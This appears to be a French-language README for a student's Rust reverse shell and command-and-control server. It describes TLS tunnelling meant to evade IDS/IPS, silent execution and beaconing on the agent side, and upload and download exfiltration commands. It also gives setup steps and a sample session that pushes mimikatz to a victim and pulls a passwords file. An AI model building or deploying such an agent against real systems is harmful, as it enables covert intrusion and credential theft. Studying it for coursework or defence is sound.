# DMC2 (Double M Command & Control) - Rust Secure Reverse Shell

**Avertissement :** Ce projet a été développé exclusivement dans un cadre **éducatif et académique** (Master Cybersécurité) pour étudier le langage Rust, la programmation réseau bas niveau, la cryptographie et les mécanismes d'évasion. L'utilisation de ce code sur des systèmes sans autorisation explicite est strictement interdite.

---

## Présentation

**DMC2** est une architecture offensive composée d'un serveur Command & Control (C2) multi-threadé et d'un agent (Reverse Shell) furtif, intégralement écrits en **Rust**.

L'objectif de ce projet est de concevoir un tunnel de communication capable de contourner les détections réseaux basiques (IDS/IPS) en encapsulant un protocole applicatif personnalisé en **Base64** à l'intérieur d'un tunnel **TLS 1.2/1.3**.

## Fonctionnalités Clés

### Communication & Sécurité
* **Tunneling TLS :** Chiffrement robuste des échanges (AES) via un certificat auto-signé.
* **Encapsulation Base64 :** Toutes les commandes, retours shell et fichiers binaires sont encodés. Cela garantit l'intégrité des données et empêche la corruption due aux encodages systèmes (UTF-8 vs CP850).

### Architecture Client (L'Agent / Malware)
* **Furtivité absolue :** Aucune sortie console (exécution silencieuse), gestion transparente des erreurs.
* **Persistance (Beaconing) :** En cas de perte du serveur, l'agent entre en sommeil et tente une reconnexion toutes les 5 secondes indéfiniment.
* **Cross-Platform :** Compatible nativement avec Windows (`cmd.exe`) et Linux (`sh`).

### Architecture Serveur (C2)
* **Multi-threading :** Gestion simultanée de multiples victimes sans blocage réseau (via `std::thread` et `Arc`).
* **Interface stylisée :** Affichage automatique d'une bannière ASCII lors d'une nouvelle connexion.
* **Commandes Avancées Intégrées :**
  * `upload <local_path> [remote_name]` : Envoie un binaire ou fichier du C2 vers la victime.
  * `download <remote_path>` : Exfiltre un fichier de la victime vers le C2.
  * `cd <path>` : Navigation persistante dans l'arborescence cible.
  * `[Toute autre commande]` : Exécution native sur le shell du système cible.

---

## Comment ça marche ? (Architecture Réseau)

Le fonctionnement repose sur un **Handshake TLS asymétrique** adapté pour un usage de laboratoire :



1. **Le Coffre-fort du Serveur :** Le C2 possède un fichier `identity.pfx` contenant son certificat public et sa clé privée. Il écoute sur le port 4444.
2. **La Connexion de l'Agent :** L'agent initie une connexion TCP, puis demande à passer en TLS.
3. **L'Acceptation Aveugle (Blind Trust) :** Le serveur présente son certificat auto-signé. L'agent est programmé avec la directive `danger_accept_invalid_certs(true)`. Il accepte donc ce certificat sans vérifier son autorité d'émission.
4. **Le Tunnel :** Une clé de session symétrique est négociée. Le trafic est désormais indéchiffrable pour un pare-feu réseau. L'agent attend les ordres du C2.

*(Note : Dans une architecture de type APT réelle, une authentification mutuelle (mTLS) ou un token secret serait exigé par le serveur pour éviter que n'importe quel scanner internet ne puisse initier ce tunnel -> C'est une implémentation que je compte faire dans le futur).*

---

## Installation et Configuration

### Prérequis
* **Rust & Cargo** (Dernière version stable).
* **OpenSSL** (Pour la génération de la PKI).

### 1. Génération de l'Identité (PKI)
*Par mesure de sécurité, aucun certificat ni clé privée n'est versionné dans ce dépôt Git.* Vous devez générer votre propre identité cryptographique pour le serveur.

Placez-vous dans le dossier `server_c2` et exécutez ces commandes :

```bash
# 1. Générer un certificat auto-signé valide 1 an
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=DMC2Server"

# 2. Packager la clé et le certificat dans un fichier PKCS#12 (Mot de passe exigé : "password")
openssl pkcs12 -export -out identity.pfx -inkey key.pem -in cert.pem -passout pass:password

# 3. (Optionnel) Nettoyer les clés en clair
rm key.pem cert.pem
```

### 2. Configuration de l'Agent

Éditez le fichier `reverse_shell/src/main.rs` pour cibler l'adresse IP de votre serveur C2 :

```rust
const SERVER_IP: &str = "192.168.X.X"; // Remplacer par l'IP de votre machine attaquante
const SERVER_PORT: &str = "4444";
```

## Utilisation

### Étape 1 : Démarrer le C2 (Attaquant)

Le serveur doit toujours être lancé en premier.

```bash
cd server_c2
cargo run
# Résultat attendu : [*] En écoute sur le port 4444 (TLS)...
```

### Étape 2 : Infecter la Victime (Client)

Sur la machine cible, compilez et lancez l'agent. *(on peut utilisez `--release` pour générer un binaire optimisé et plus léger. Sinon classique -> cargo run main.rs).*

```bash
cd reverse_shell
cargo run --release
# Résultat attendu : (Aucun affichage, exécution furtive en tâche de fond)
```
### Étape 3 : Post-Exploitation

Dès que l'agent s'exécute, le terminal du serveur C2 affichera la bannière DMC2 et vous donnera la main :

```text
[*] Connexion entrante...
  _____  __  __  _____ ___  
 |  __ \|  \/  |/ ____|__ \ 
 | |  | | \  / | |       ) |
 | |  | | |\/| | |      / / 
 | |__| | |  | | |____ / /_ 
 |_____/|_|  |_|\_____|____|
                                                   
    [+] Connexion à la cible établie avec succès !
    [★] DMC2 - Développé par Mohamed MESRI

Shell> whoami
desktop-victim\admin

Shell> cd C:\Windows\System32
Repertoire change.

Shell> upload exploits/mimikatz.exe mimi.exe
[+] Upload: Envoi de 124056 octets encodés...
Succes: Fichier uploade.

Shell> download C:\Users\admin\Desktop\passwords.txt
[+] Fichier 'passwords.txt' reçu (1044 octets) !
```
---

Projet réalisé par Mohamed MESRI.